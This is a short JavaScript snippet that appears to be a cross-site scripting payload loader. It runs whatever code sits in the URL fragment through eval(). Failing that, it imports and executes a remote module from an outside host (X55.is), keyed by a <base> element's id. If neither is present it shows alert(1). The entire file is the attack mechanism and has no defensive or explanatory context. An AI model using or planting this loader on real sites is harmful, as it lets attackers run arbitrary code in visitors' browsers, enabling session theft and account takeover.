if (document.location.hash) {
   var frag = document.location.hash.match(/[^#][^#]*/)[0];
}

if (frag) {

  try {

    eval(frag);

  } catch(e) {

    alert("URL fragment (#) contains invalid JS code, try again!");

  }

} else {

  if (document.getElementsByTagName('base')[0]) {
     var id = document.getElementsByTagName('base')[0].id;
  }

  if (id) {

     import('https://X55.is?1=' + id);

  } else {

     alert(1);

  }
}
